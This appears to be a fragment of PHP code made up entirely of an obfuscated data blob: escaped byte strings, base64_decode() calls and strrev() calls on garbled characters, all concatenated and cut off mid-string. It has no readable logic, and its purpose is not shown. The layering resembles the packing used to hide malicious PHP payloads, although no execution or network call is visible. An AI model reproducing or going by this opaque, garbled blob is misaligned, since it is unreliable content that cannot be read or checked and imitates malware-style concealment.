\343\37\361\101\366\211\272\101\303\100\40\44\365\113\204\335"."\227\264\40\6\323\64\51\51\306\271\313\3\74\51\223\161\1\133\30\314\13\36\7\106\300\203\266\337\200\22\320\210\304\350\134\63\300\176\305\103\233\223\342\133\337\130\260".base64_decode('0xfywI1zbE4o2NFKMvRnFNoAP0F/FRWfyP7Z5CwMyD4y3UJxpHdrFJVL8M9p+Ac=')."\210\175\244\162\45\117\261\36\207\334\234\61\6\272\47\2\263\201\162\142\255\310\152\213\153\132\226\316\123\40\1\60\176\300\166\336\335\6\45\222\1\312\174\306\321\45\215".base64_decode('rCiR4ExfR4xSFg4J1IgBYC8bDBGEmFoP3VDhyJAvTGe5rvQWVYout2scoWIFLFo=').strrev('˘Üå’wQ›D6∆3U(nY‘_…*x%óQBH8Èılc‡ÆqŒ˘™∏ˇh¬˜z§').base64_decode('55DsHKpxTnEuGBd1jR1HAAsW1zrqlsIEIOGM0QvAT2N0xpio87SzFp0+P7qgsmE=').strrev(')Kâ‚Ëp-Hb4ÑÚƒy$±0 $–*∏‰‘÷Aâã6¢â=h3±ÍÇˇhË◊Q)‹')."\x8c\xa1\x92\xe6\x39\xe6\x3b\xa3\xe3\x16\xcc\x10\xf2\x9\x20\x7b\x5d\x40\x58\x2\xfc\x37\xc3\xd2\x79\x9c\x67\xc2\x9e\xb1\xac\x70\xde\x13\xfa\x28\xe6\x13\x9c\x7b\xc2\x79\x11\x97\x13\x84\xf".base64_decode('qOk8m0JACmCbdKucvngM/l1KBzKtDFDWkE+pOqHOYl7tpTqIvNJLPjST0ndcMfs=').strrev('B¬P\\Ñç© ç8…‰©(Y˙…îÖ§+vÇö'."\r".'5$,H≤Ñ%C†‚	n'."\0".'J').base64_decode('D2OxiKcp4ItRDkM4MQ0jrtjEtHaga5yjUv6Q4EI62o+QmW/0ZiXEGCRF1zW9AWk=')."\47\215\142\1\12\163\140\357\145\2\334\112\140\343\56\65\116\227\60\312\111\276\230\70\0\5\231\112\16\160\57\55\110\3\220\103\221\66\25\370\10\31\100\4\243\362\220"."\xbb\x2a\x1a\x2d\xce\x57\x92\xb\xe6\x3\xc2\x97\x9d\xa9\x5\x8b\x27\x2c\x1d\x4b\xe5\x78\x77\x14\xfc\x47\x3\x9e\x32\x4a\xb4\x18\xe3\x86\x31\xb0\x3e\xbb\x60\x3b\x98\x1e\xc4\x12\x60\xd1\x38"."\250\351\114\150\52\130\304\156\123\63\345\254\245\210\10\204\120\326\104\27\156\242\62\300\243\35\340\34\13\56\345\202\16\22\261\323\16\246\140\143\12\20\101\375\5\163\204".base64_decode('FdPFUjiEyBgIk/7hfxsrKLPPg+nULCx1WH8THjRMJWdRWRqKrCcyLcVs1mTCf1Y=').base64_decode('7SE1kLmyqFzaFk2nm9xqUm9FdbmE/nwebElF2uKraqsHyC8RqYqq9yR/h9QUDAY=')."\174\236\16\11\56\340\144\341\1\322\101\330\327\351\1\253\26\334\56\207\43\76\242\161\364\173\235\264\334\271\116\77\331\120\261\17\65\111\307\11\60\73\223\102\211\302\213"."\204\240\174\351\200\272\35\7\224\42\34\240\271\16\270\131\162\160\231\336\301\65\146\216\76\125\351\107\37\114\264\166\20\211\333\141\312\72\20\6\240\110\114\76\375\136\207"."\152\170\321\166\2\125\200\242\150\203\314\14\324\142\144\345\101\7\156\134\100\351\123\262\16\332\64\7\155\261\203\156\7\34\150\173\347\45\315\352\2\23\207\64\13\175\2"."\376\230\161\100\122\201\224\352\340\32\75\122\235\260\377\160\360\275\211\43\255\153\305\102\47\255\111\10\341\306\20\0\157\51\3\204\64\315\164\320\375\246\243\164\53\132\36".strrev('|˘≥_ÊÿÇe>tñ>K/J_5≤D∏≈™[≠Ú)Låè…E*åõØmêéõÂw')."\x84\x1d\x6a\x91\xfb\x44\x32\x2b\x47\x72\x74\x9\xa1\xe4\xc9\x55\xec\x5c\x3\xcc\x45\x5a\xfb\xe6\xd2\xae\xbf\x85\x95\x46\xe4\x74\x58\xa8\xce\x94\xd3\xb4\xae\x32\xb1\xf8\x3b\xa4\x24\x6\x13"."\174\203\352\25\266\275\326\20\33\0\64\123\312\121\171\371\201\145\224\313\306\141\344\210\21\24\221\224\234\331\240\132\146\301\217\317\77\322\23\304\316\202\5\56\20\340\306"."\x42\x96\x1a\x6\xb\x54\x4b\x56\x26\x2b\x50\xad\x18\x4d\x98\xa9\xc3\x1a\x82\xd3\xc7\x85\x98\x2b\x3a\xf3\x8\x33\x6d\x45\xc0\xd7\x12\x91\xce\x8\x2\xc6\xa4\x6a\x31\x9c\x27\x6\x13\x4b\xe8"."\x1f\x2d\x2f\x59\xca\xa6\xe8\x92\x1a\x51\x3c\xf\xcb\xf9\x24\x86\x2c\x2\x5c\x7b\x51\x63\x5\xad\xa4\xc2\x92\x9d\xd3\x82\xb5\x11\xe\x1a\x94\x4a\xa9\xb\xa2\x5b\x44\x2\x5c\x87\x50\xf7\xf9".base64_decode('SkNBQb6wFYkUJxtkPwWV1ORLoTA+tCLxofG1A2i7LPXCIJ84lCQkWIFDkDsg+3A=').base64_decode('8ikgBMmPFfM2wrStihBTnWp+UM2LqioO5QsrX9fhRLYp17z7+sarBVeFOYiKzJE=')."\x55\xf3\x3d\xc2\x9a\xcb\xf5\x30\xa0\xf5\x30\xab\xd0\x76\x52\x92\xad\xe5\x94\x93\x92\x4e\x77\x81\x8d\x7d\xcc\x36\x91\x9\xe1\x67\x64\x9d\xe3\x94\x72\x1c\x38\xed\xb9\x2\x10\x26\xe1\x41\x21"."\131\112\356\343\62\207\45\217\300\67\14\163\220\266\136\374\264\26\212\203\336\175\5\332\230\276\242\134\120\144\111\252\21\0\270\53\367\215\172\32\321\312\6\241\26\215\176"."\153\210\376\351\241\266\145\275\107\73\376\52\12\43\2\105\114\320\3\60\116\145\315\207\33\350\141\314\36\10\351\131\260\304\351\56\70\231\132\341\212\45\56\26\214\271\33"."\160\165\24\51\64\254\200\131\104\40\274\264\160\111\234\230\232\353\200\340\102\300\27\16\212\171\76\57\371\150\360\111\150\41\234\64\157\151\21\244\210\225\66\12\22\177\371"."\160\213\256\61\121\227\311\1\366\104\315\150\57\151\212\250\27\26\161\1\121\26\171\243\4\44\344\261\113\36\66\250\55\150\307\67\131\252\60\210\152\232\345\144\116\315\273"."\164\274\350\271\300\16\201\234\31\73\152\4\221\214\163\252\305\6\132\132\310\42\271\324\106\0\246\246\201\155\247\356\322\101\315\274\101\104\350\57\262\141\130\100\132\205\212"."\342\351\4\146\211\142\2\32\335\300\302\371\357\113\252\46\204\300\125\116\243\352\151\236\120\70\267\145\60\221\373\242\105\244\144\20\270\100\357\30\143\111\131\156\251\167\125"."\xa3\xd5\xd9\x55\xfe\x38\x1a\x1e\x68\xe3\x2f\xc1\x86\x23\xc7\x4e\xb8\x11\xd0\x65\x98\x5a\x81\xc7\x8\x41\x1c\x2d\x44\xf1\x42\x85\x54\xc\xd1\xa8\x1d\x80\xd4\x93\x48\x7e\xe5\x88\x42\x69\x49"."\136\264\271\305\263\311\225\5\51\204\143\23\277\327\243\353\224\174\160\347\240\46\35\0\105\20\344\113\141\112\373\345\26\32\134\270\257\217\333\146\340\242\140\305\56\74\23"."\135\162\62\31\244\232\155\361\273\64\251\250\350\53\137\20\62\227\141\105\11\241\362\311\75\331\54\77\104\267\207\367\231\5\117\72\61\223\10\331\147\266\26\264\263\244\247"."\135\345\140\154\317\41\12\324\126\1\232\233\64\330\5\155\53\57\335\267\364\261\17\146\303\7\264\174\30\254\324\315\31\65\257\30\154\301\325\215\162\274\343\377\263\230\133".base64_decode('OgZwruyLcGCcoBzWFQgQV1emAeWsSRAg0GIcMy2iTwiVIUweCz2AyYr7DJcHfxA=')."\x4c\xc6\xf2\x14\x6a\x4f\xa7\x50\x1d\x30\xe2\x73\x3\x6c\x89\x13\x33\x1\x8a\x82\x72\xd3\xbe\xca\xa4\xd1\xac\x28\x2e\x64\x2d\x7f\x60\xf7\x13\xaf\x6d\x3c\xef\x91\x7\xce\xc5\xe1\x75\x7f\x3a"."\157\333\366\167\376\103\26\213\376\334\140\117\141\10\7\352\360\317\222\3\301\377\45\166\173\347\316\125\265\327\376\174\374\167\241\317\372\47\237\167\120\353\163\33\377\63\175".strrev('ù˝≈·π~+3c¨€c~ùÏN/ï´Óøﬂ˜À∆˘æ≥tpû∑O˜˝ôØÆu˝').base64_decode('L5x22AsVnqM/ezNy+Sfuhj1bJ5x0xqzuE99Y17/xPwNvrBwY/pv3yeBDrd+fNeM=')."\xf9\xb3\x9a\xde\xd4\x17\x25\xff\xb9\xee\xb7\x9f\x75\x6f\x98\xfb\x5b\x67\xf8\xca\x5b\x9f\x3a\xf9\x9f\x83\xbf\x59\x5e\xb3\x29\xbe\xfc\xbf\x77\xbc\xe5\xd8\xf1\xf2\x8a\x17\x1f\xd9\x31\x74\xe7"."\x23\x55\x9e\x77\xce\xdb\x76\xda\xcc\xf7\xef\x9e\xf2\xc9\xd6\x59\x7b\xee\xba\x33\xdd\x1a\x1e\x37\xe1\x97\x33\xdf\xff\xfe\x0\xf5\xf1\x11\xff\x1c\x7d\xe8\xdf\xee\x3b\xea\xa0\x5d\x73\x2e\x78"."\x6a\xc7\x71\xb9\xf3\x2e\x5a\xb7\x68\x49\xc3\xf0\x26\xe5\x8a\x1e\xf5\x3a\xdf\x6b\x13\x1b\xf\x5d\xf9\xd4\x21\x5f\xb6\xac\xf2\xe6\xf\x39\xa9\xe5\x94\x8f\xa7\x8c\xaa\xdd\xf2\xcd\xb7\x37\xbc".strrev('´·‚∏Í[p˘tx≠ËZØá_¡‡~›8w1û÷ÕÎ6?W’º/«|˛¢Û∏çáì»¯')."\330\175\276\136\367\336\204\307\162\333\167\174\134\375\341\272\67\162\37\157\34\130\171\330\222\325\7\136\173\306\250\340\61\7\237\273\376\17\207\314\323\36\236\377\124\375\254".base64_decode('f9+zZvFnl776zOIrCwd/M/nud6+/dseO+J07k784O6U+ceYNZ27qeuSihomOY68=')."\170\365\304\276\135\213\246\375\144\307\175\57\173\316\336\374\374\237\137\135\376\317\331\75\327\76\165\343\5\371\71\17\365\374\342\335\157\307\104\366\334\366\327\143\173\36\214"."\216\173\347\363\320\61\267\77\364\321\355\53\256\273\155\115\313\37\176\376\305\252\163\302\7\254\251\213\126\377\144\323\213\157\45\27\274\64\363\314\15\73\35\373\237\236\136"."\171\310\232\370\167\343\16\171\377\304\271\171\217\363\255\63\136\377\365\225\211\375\206\217\375\345\302\275\347\37\273\273\342\251\105\143\56\110\135\263\161\355\252\221\57\325\251".base64_decode('D7dXnfzkxTf/c7/LVu2/3VW3or65vrr2kk/fTy86SH7+rnNX3VJpRJq7HozsXLY=')."\372\57\313\126\355\334\225\356\174\76\361\334\251\133\12\365\123\76\136\65\367\266\273\226\365\134\333\77\362\360\232\167\6\176\365\233\135\307\237\166\373\343\73\216\333\357\244"."\x53\x67\x7e\xfd\xd4\xa3\x9f\x6c\x5d\x7e\xc0\x45\xdb\x9e\x98\xab\x5d\x39\xf7\xca\x7b\xf\xfa\xfb\x3d\x8f\x4c\x3a\x6c\xc9\x48\xf5\xd0\x7f\x7f\xd4\x79\x84\xe3\xfc\x4d\xab\x2b\xae\xdc\x32\xb1"."\x6f\xf4\xc4\x5a\xc7\xc8\xad\xd3\xb7\x3e\x70\xe3\x11\x9f\xbe\xf0\x8b\xc3\x7f\xf7\x51\xa4\xe3\x7a\xf7\x5f\x9a\xde\x6a\xbc\x38\xde\x12\xdb\x1e\x78\x35\xba\x32\xfb\xc0\xd1\xd\xd2\xaf\x7c\x35"."\x5d\x27\x9d\x98\x38\x78\xde\x17\xc9\xf\x7a\xdd\x2f\xfd\x6a\xfb\xd5\x57\x5c\x31\x73\xd2\x4d\xae\x3d\xab\xe\x19\x11\x5e\xd6\x3c\x6a\xf7\x75\x95\x4b\x5e\xf2\x4e\xbf\xe6\xa2\xc6\xd7\xee\x52".strrev(''."\n".'ﬂ€U_ÎºŒÚ∂Üß˚ŒGá‘˙Ì:ÿ.∑oé˝u'."\r".'µ⁄Ë˝∞8ˇª˝BˇZO')."\x7f\xb8\x7c\xca\xbc\x7\x26\x7a\xbe\x1a\xbd\xbd\xe7\xd5\x5f\xf6\x6d\xba\xe4\xe0\xcb\x13\xbd\xb7\xad\xbe\xf9\x57\x73\xef\x3f\xe3\xba\xc5\x9b\x8e\xba\xe9\xe5\x67\x9f\x1d\x7d\xfb\x86\xfa\xf9"."\xbf\x8c\x9d\xf6\xa7\xdc\x5\x3\x4f\xd5\x3c\x7d\x49\xc5\xd1\x87\x3b\xfa\x2f\xbf\xe9\xfd\xde\xcc\x69\xeb\x57\xbe\x32\xe6\x98\x11\xeb\x17\xb5\x76\x1e\xb6\xdf\x84\xa7\xff\xbd\x71\xf7\xb9\xff".base64_decode('0rakpnacsHbZ+vVrX7y15enhL6/Zb9HpFbHHE7d/uf8nRykXPL6rac6xP539xT8=')."\x77\x5e\x16\x7f\xf4\xc8\x89\xf7\x7b\x3\xfd\x95\xa7\x9f\x7f\x4b\xee\xe5\xbb\x3e\x9f\x79\xeb\x16\xef\x2b\xbf\xeb\x99\x1b\xde\x7c\xc4\x79\xd7\xd\x77\x3c\xf9\x8f\xb3\x7e\xba\xe2\xfd\x67\xc3".strrev('{ï≈¯›ºﬂ¶⁄<O!ÚsÔ”©¯¸∞u/9‘˝ææﬂ…iœqÕo]£ºï|vˇ')."\x39\x75\xda\x5d\xe3\x2a\x56\x44\x17\xae\x3b\xf2\x88\x23\xc7\xbc\x18\x7c\xeb\xfc\xe1\x1d\x95\xea\x65\x81\xda\x1d\xf5\x57\xbe\x5b\xbf\xb4\xed\xe4\xc3\x9e\xfc\xdb\xec\x9e\xd7\xb4\x71\x7\x6f".base64_decode('ePrC208+rLJl/qIZ124yXz/oyj9WPXLvinMWtB84/qu613f0H3rJlEvif1xz3Yc=')."\xd7\x3e\xb2\xb5\xa9\xed\xe2\xdd\xa3\xe7\xcc\xc9\x2c\xbc\x69\xef\x11\x23\xe5\x3\xc2\x27\xd5\x9d\x34\x33\x17\xa9\xbe\x6d\x61\xf5\x8a\x77\x6e\x5c\xf9\xc2\x7e\xaf\x54\xeb\xeb\x8e\xfe\xb4\xed".base64_decode('Z+ecP/yPn3tGjPWNWGaM+911BwX6v/jq6zN6ao57Y85XzS1b3nw91PL4P70vDV4=')."\xf2\x74\x76\xdb\xba\x55\x6a\x28\x3b\xf7\x9a\x8c\x67\xc3\x42\xef\xbd\xba\xe7\x8c\xb3\x23\x73\x27\xfa\x6f\xba\xfc\xbd\x6b\x6f\x7c\x4c\xf7\x75\xae\xda\x76\xcd\x15\x3b\x46\xf4\x3f\xbf\x79\xeb".base64_decode('z86ti+65oC77/RUjnmlruPDJP/zhdumG935/1+8v/fXCm3bvemxk+3Pf1Lx+1WU=')."\241\107\176\222\231\130\371\346\264\337\16\75\176\365\342\207\66\356\134\177\357\121\7\373\365\133\56\70\141\144\333\232\333\67\177\166\141\363\153\133\133\266\326\157\250\170\256".base64_decode('ZtSxWv6imvV7nz/rzlNuP36h0Xnslk2OF484suKDB5YvjFZrGzbNqz9/+e6/Dj0=')."\x77\xd7\xf2\x66\xf3\xf0\x4d\x89\x4d\x23\x1e\x4a\xcc\x5c\x3f\x76\x93\x63\xcb\x9b\xf\xfe\xf5\xfe\x85\xb7\x1f\x37\xea\xaf\xcb\x4f\x6d\x3b\xe7\x93\x3d\x85\x7f\x24\xae\xab\x2d\x5e\x78\xf3\x31"."\x67\x5e\xbc\xa3\x7b\x68\x79\x6c\xec\xb4\x75\xa9\x8a\x31\xf7\x45\x1e\x28\x1c\xf0\xf5\xf4\x8f\x63\xcb\xff\x35\x7a\xe5\xc1\xa3\x9f\x9f\x79\xd3\x75\x97\xfe\x64\xf1\xd1\x2f\xcc\x7d\x76\xed\xb6"."\x67\xc6\x2f\x3f\xed\xca\x37\x4f\xec\xbb\x6c\xf7\xbf\x33\x8e\x91\xe1\x51\x27\xee\x7a\x7b\xbf\x37\xd7\x5\xe\xbb\x6c\xd6\x9f\x5e\xf9\x55\xb1\xf5\x91\x65\xe7\x47\xd7\xae\x5d\xf8\xed\xb7\x1f"."\377\346\253\33\136\172\103\375\340\303\376\203\153\377\275\337\107\25\157\355\372\315\304\161\213\63\227\307\77\250\117\276\266\364\206\350\113\331\243\226\35\162\345\152\355\215\227"."\147\265\316\30\237\176\72\176\123\274\271\351\215\266\277\75\164\300\121\127\77\220\272\373\372\265\177\154\357\72\367\330\53\36\271\175\352\256\337\305\36\172\174\305\55\236\157"."\x3e\x6b\xa9\x59\x7e\xe9\x89\xf7\xd4\x7a\xfa\x4f\xdd\x78\xd8\x21\xcf\xff\x64\x68\xdd\xf4\x5\x1b\x8f\xd3\xde\x48\x7e\xba\x45\xcb\xc\xdd\x1f\xf9\xc3\x1b\x7f\xdf\xb5\xc4\xd8\xdd\xde\x32\x7a"."\346\324\352\111\267\265\57\330\60\151\362\27\273\63\257\136\367\247\205\275\263\67\317\166\74\370\325\360\335\163\316\376\357\337\236\110\237\175\377\300\227\237\175\23\14\76\74".base64_decode('+N3TT2xfq8W2fvPJ+0+8+fwb3+/ZccvZ08/++G9ffnjWWeqo475e8MVLi2eEvn0=')."\165\306\345\153\66\334\130\363\124\146\331\305\77\375\372\325\343\157\154\312\74\263\145\362\215\337\215\377\327\237\13\361\23\147\357\34\273\261\376\363\113\56\254\376\74\173\334"."\xcb\x6f\x55\xaf\xbb\xf8\xad\x73\xae\x58\xdd\x74\xc8\xf7\x17\x1f\xfe\xbb\x43\xda\x4f\xb8\x74\xdb\xb3\x23\x9e\xba\xfe\xf\xc7\xac\xbc\xe7\xcb\x4c\xb4\xe7\xd4\x1d\x2d\x7f\x77\x5c\xb8\xe5\xc4"."\xa7\x47\x5f\xfd\xd7\x86\xb5\xff\xbd\xe9\xa0\x9b\xfd\x4b\x9e\x89\xdf\xfc\xc1\xaf\x77\xd4\x15\x7e\x76\xf9\xb9\xdf\x2d\xbb\xe4\xf3\x43\x76\x29\xdb\xbd\x37\x3f\x77\xc3\xe8\x6b\xd6\xfa\x8e\x8"."\256\254\375\373\302\170\333\326\376\142\342\273\374\277\67\254\172\356\311\53\47\151\143\333\337\71\154\225\176\323\147\3\211\117\167\76\370\372\33\233\137\256\373\354\122\337\27".base64_decode('Gx8Z8Yujb+rqODixevHCC3Z+M6zfUHXfOQdXPme0XXb8QvdFv+o9+IZ0+Oc3vzg=')."\356\324\155\207\375\375\374\323\36\235\275\60\272\376\356\361\255\253\242\267\57\153\231\233\273\154\126\61\76\352\334\125\306\224\135\153\227\233\227\232\243\7\327\374\275\166\377"."\101\307\53\43\237\74\345\223\145\332\13\253\127\275\125\173\361\302\313\122\337\325\365\334\325\264\360\262\344\323\153\374\313\326\335\62\274\355\117\313\257\350\74\271\161\365\107"."\163\66\257\357\135\321\335\267\152\371\257\326\374\66\336\33\74\352\12\317\260\176\251\162\277\336\161\357\71\17\135\272\60\177\377\51\73\46\137\161\323\351\337\177\63\352\362"."\57\156\370\157\373\273\215\367\157\117\45\17\332\270\361\257\77\373\373\3\273\237\135\35\374\246\353\316\232\223\275\357\205\76\35\165\317\3\253\207\336\313\117\70\157\316\55"."\377\171\362\105\371\353\102\327\33\47\374\373\232\235\343\56\154\320\2\77\175\374\13\171\323\77\376\363\376\15\115\3\337\173\306\277\375\354\332\77\176\231\331\62\165\326\326".strrev('Ÿ~ºd|œ˝Ò}Ô[]çÓ∫4åuWùÓcgˆ{øMˇj˝\'—ËÍˆﬂ˜Ù.Œ∂◊Óƒ¶¸').base64_decode('5PrdXbe+kPf8+omfN9/haL/6NPc57xp/OMZ/4FvH3bN4xbhM38UnnnPPaS3Xn50=')."\xbd\x7b\x4d\x34\xba\xe6\xbb\x8f\x7e\x7a\xe8\x47\xbf\xe8\xac\xda\xf9\xec\x7\x47\xdf\x73\xfa\xb2\xbd\xf3\x4f\x7e\xd8\xa1\x5f\xfa\xd8\x57\x3b\xe7\x77\x1e\xf6\xe8\xca\xde\x27\x8f\xff\xd3\xce"."\47\43\177\374\146\366\21\306\11\235\377\270\167\376\77\236\334\166\357\53\333\152\274\147\236\31\132\367\115\343\236\347\103\51\165\303\173\107\313\321\372\113\246\336\267\364\314".base64_decode('Vz6+oaPm9ZtvWXv9O/o5z047P/Wfl+96fOfFr1yyJHP+hjXD91WcPKV45nv+Cdc=').base64_decode('r1Jjtz0amXnC8ObHz318Yc1l2xZVHLpg/pILh078xdHnXdTb/9TVK375+lJ37wM=')."\337\375\365\230\130\337\306\263\46\77\72\156\341\151\273\377\333\174\353\363\123\257\130\162\322\273\305\154\342\260\203\366\206\236\362\175\321\160\307\71\323\236\270\140\334\226\256"."\xfd\x8d\xf6\x7b\x46\xf8\xf\xfd\xf9\xf6\x97\x8e\xbd\xad\x6e\xbf\x7b\x8e\x3c\xd4\xb9\x68\xf2\xc9\x7b\x9f\x79\x6d\xcb\xc0\x33\x17\x85\x2e\x1a\xf3\x8c\xf2\xe0\xc6\xd9\x53\xcf\x7c\xee\xd0\xcf".base64_decode('H8uf/WVhS2HouImjfC/+ZMr0N9ZPdwx0Re5778ktWzYsv//B7FE3TX3/ucYnoic=')."\xde\x73\xed\x15\xa3\x76\x7e\x7e\xf0\xbf\xef\xbb\xb3\xe1\xa0\x8f\x2a\xaf\xe9\xdc\xf8\xfe\x6b\xff\xfa\x6c\xfd\xaa\xf9\x57\xae\x1e\x35\xe1\x93\x96\x15\x67\xfb\x56\x65\xce\xfb\xe3\xb3\xa3\xdf"."\xdf\xe4\xfe\xe7\x8c\x43\xb2\x47\x9e\xe3\x48\x6c\x18\x98\xfb\x4c\xdb\x55\xd2\xbd\x47\x3a\x4f\x6e\xdd\xf5\xe1\x45\x2b\x9f\x3b\xeb\xf0\x5d\xc1\x7b\x2f\x5a\x56\xbc\xf8\xf9\xd6\x25\xc7\xef\xdd".base64_decode('fUHipE/CF0097NEdh2//pv2h6/Z/+IWfrdm2+KOrP7jD1fHRlhPOOeahYx+afrk=')."\xf7\xf4\x3d\x9e\xc9\xea\x55\xb5\x47\xae\x4d\xcf\x7e\xfc\xb1\x6f\x9a\x97\x39\x97\x6e\xbe\xee\x88\xdd\xdf\x3e\xf2\xe5\xa7\xf\x3f\x38\xf4\xc5\xf0\x1f\xdf\x5c\x72\xd6\xc7\x4f\xb8\xff\x32\xfd"."\xbf\xef\xbd\x3f\xe3\xe1\xe9\x5f\x7f\x74\xc3\xa7\x87\xff\xfe\xc1\xaf\xbe\x9d\xf1\xd0\x97\x7b\x76\xdf\x9d\x8e\x6d\x53\x5e\x7e\xe2\xe5\xb7\xdf\xfe\xfe\x9b\x86\xef\xfe\xf3\xf9\xa8\xe7\x67\x2c"."\xee\xfd\xee\xe3\xaf\xd3\xf\x7f\xf5\xc1\xdf\x5a\x47\x5d\x75\xf6\xe7\xaf\xac\x3c\x7b\xe9\x57\x6f\x9e\x7d\xf6\x5f\x46\x8e\xbd\xf5\xf7\x57\x75\x9e\xbf\x78\xde\xc4\xc1\xf3\x2e\xbf\x76\xf4\x9"."\x17\xee\x1c\xbc\x66\x8a\xf6\xda\xfd\x1f\x37\xcc\x5d\xff\xc5\xbd\xeb\x76\xbe\xf3\x79\xff\xe6\x43\xee\x6b\x7b\x65\xc3\x86\xbe\x5b\x5e\x7d\xf5\x8d\x77\x3f\x7c\xe3\xc4\xf7\x3f\x38\xfc\xf0\xc3"."\132\167\77\375\342\307\337\36\174\370\250\123\272\136\276\163\174\375\206\113\327\175\260\171\333\225\137\173\216\163\136\376\307\317\325\353\346\126\317\271\355\336\241\33\326\155\371".base64_decode('9IAXTth19be/bgxNVKf98vd3P1H569/MuP+x32j71T69YPLQvA3/GnPvyFXPXHA=')."\xd7\x61\xf9\xa7\xce\xce\x36\xa5\x56\x78\x96\x46\x7b\xbd\x73\xf7\x9b\xd5\xf8\xf1\xd5\x3d\x7f\x79\xf9\xf7\xdd\xbd\x1b\xbf\xa8\x3b\xfb\xb9\x1b\xee\xbe\xbd\xf2\xcf\x8f\x7c\xbf\xdf\x57\x1f\x2c"."\x7f\xbb\xe5\x78\x7a\xcd\xa4\x6e\xe2\x24\xfc\x11\x4f\x16\xe0\x79\x37\xe\xd4\x4f\x9e\x88\x3f\x88\xd1\x92\x96\x35\x7b\xa\xfd\x64\x13\x49\xb4\xe7\x60\x53\xd0\x93\xcf\x10\x1d\x5b\x8f\x9e\x1e"."\52\120\215\363\204\72\222\73\73\124\64\173\6\310\211\154\146\240\50\353\375\104\120\47\266\371\165\244\374\11\123\210\225\126\355\44\142\133\67\241\236\124\63\271\216\174\114"."\231\100\62\365\306\13\172\167\232\30\44\246\123\175\152\256\330\113\345\372\254\252\350\344\154\221\224\150\246\372\365\241\42\71\323\357\51\246\6\265\76\222\172\40\225\357\57"."\146\310\116\247\77\233\317\304\251\132\244\226\42\145\302\4\322\234\311\265\244\245\172\177\167\6\224\102\352\353\36\324\324\41\242\34\57\26\206\322\211\156\152\50\77\205\140".strrev('¥õ∞}Is¶Vì†∂rC™Å"q6√D”dœOÆZ‘)§≈Aî˚SRˆÖ4ªD3VÈÔU').base64_decode('fzA10K31kb1urtfoT6VJRRMnTaKlkJGoryFVJ/Pd6UwfaXJfTzqpmaSEHlPpz3Q=')."\x93\xf1\x9c\x58\x47\x3a\x90\xcc\xc8\x66\x6a\x88\x90\xc5\x50\x3c\xa3\x17\x53\xb4\xfa\xa1\x42\xbf\x69\x10\x9a\x98\x38\x9e\xc\xce\x80\xda\x57\x1c\x8a\x77\xd3\xea\x27\xd0\x4e\xc4\x95\xac\x41"."\321\60\211\224\135\133\113\372\70\261\236\16\126\16\40\167\210\264\101\37\350\55\50\164\174\122\31\145\260\47\137\240\255\43\344\63\211\214\212\152\366\30\275\5\122\253\322"."\xdf\x97\x37\xe2\x84\xea\xc6\xd7\xd3\x5f\x32\x92\xe3\x27\x90\x4a\x73\x4a\xb7\xd6\xdf\x4b\x76\x95\x79\xb5\xd0\x6d\xe\x52\x2a\x89\x77\x27\xe5\x42\x1f\xa5\xe1\x74\x51\xee\xa3\x77\x11\x32\x89"."\x5c\x96\x2a\xb7\x26\xd6\x91\x66\x4c\xa0\xed\x99\x42\xc9\x45\xc9\xf5\xa6\xe5\x2\x69\x7a\xed\x14\xda\xdc\x5a\x82\x8e\x29\xe3\xe9\x1c\xca\xf\xa6\x87\xc\x92\x6e\xca\x64\xd2\xd6\xfa\x29\x53"."\x28\x15\x4d\xa4\x19\x48\xc1\xb9\x64\x51\xce\xd2\xdd\x79\x3e\x15\x1f\x30\xd2\xdd\x14\x41\x7d\x7a\xb7\x4a\xa8\xa7\xb7\x47\xcb\x17\xe8\xa9\x8d\xd6\x1d\xef\x2b\xf4\x92\xdd\x6e\xdc\x84\xba\x34"."\62\22\175\331\174\261\237\366\172\142\35\251\43\75\50\247\342\5\2\355\316\244\322\175\324\12\246\176\62\301\367\344\311\304\124\145\110\126\164\200\174\202\67\3\220\147\212"."\x60\x27\xad\x1b\xc5\x1\x93\xd0\x4a\xdf\x40\x3e\x59\xec\xa6\xba\xe2\x4c\xb2\xa7\xdb\xa0\xc6\xd\x3\x8a\x56\x18\x24\x53\x56\xef\x33\xb5\xa1\x14\x9\xc\xea\x46\x7a\x40\x21\xcd\x2e\xe6\x73".base64_decode('fb0Z0iajYKaSPUU6sASX3X1KomiSYsfXks50Z/u0TC85KKmbQEZiwFDzzJ6njow=')."\312\140\257\71\24\357\47\305\26\63\106\274\57\101\346\371\144\306\236\350\307\244\172\202\200\11\343\47\121\316\105\160\223\63\373\15\175\210\222\137\55\211\116\233\311\104\116"."\41\320\376\144\266\57\223\43\135\63\372\122\275\3\164\346\116\242\34\61\256\366\311\271\42\31\301\372\11\244\224\234\134\354\31\320\110\253\346\345\10\7\151\222\23\75\124"."\xab\x6e\x98\xb2\x59\x34\x6c\x9\xd8\x95\xa6\xbc\x2b\x27\xe7\x99\xf9\x51\x1b\x69\x4e\x42\xb4\x75\x17\x13\xf4\x28\xa\xb5\xbf\xa6\x76\xdd\xdc\xbe\xc5\x28\xa2\x9b\x22\x4\xae\xe6\x14\x7e\x3c"."\x90\x8c\x73\x45\xc\xd4\x6b\x9\x56\x31\x30\x18\x16\x73\x26\xf2\xa6\x10\xd\x42\x96\xd8\xb0\xa9\xe9\xcc\xe\x7\x5b\xf8\xb9\x60\xab\x5c\xd6\x7e\xd6\x10\xac\x95\x39\x2\x26\xea\x76\xc3\xe8"."\327\164\202\216\36\55\231\310\152\305\244\245\324\144\334\122\46\203\122\375\223\75\46\265\17\70\50\207\237\326\13\60\13\202\342\150\304\230\175\26\374\217\64\27\137\312\63"."\x14\x40\x9d\xec\xd2\x8\x4e\xed\xa2\x63\x10\x17\x86\x1b\x1f\x64\x98\xb2\xd1\xe3\x12\xc1\x4e\x31\x56\xcd\x83\x66\x66\xb3\x2e\xeb\x65\x4d\x78\x73\x8f\x52\x47\x8c\x1b\xaf\xc3\x76\x76\x9\xd6"."\127\60\54\350\234\205\16\361\101\23\60\50\216\235\265\363\364\150\356\235\115\133\206\127\137\276\167\315\35\173\127\155\34\176\340\322\167\66\336\61\374\340\32\20\334\263\371"."\302\341\215\327\274\273\356\334\75\233\127\355\331\374\353\167\316\273\347\303\255\27\14\257\336\364\316\362\7\207\257\272\165\370\306\363\366\154\171\360\235\207\317\173\373\326\225"."\x7b\x36\x6f\xd8\x7b\xd5\xf9\xc3\xe7\xde\xb7\x67\xcb\xe5\xc3\xbf\xbb\x76\xf8\xbc\xd5\x7b\x2f\x5d\xb5\xe7\xc1\xab\x40\xfa\xbd\xbf\xe3\x25\x83\x64\xc3\x1b\xae\x80\x79\xb7\x9e\x33\xbc\x79\xf3".strrev(']fgh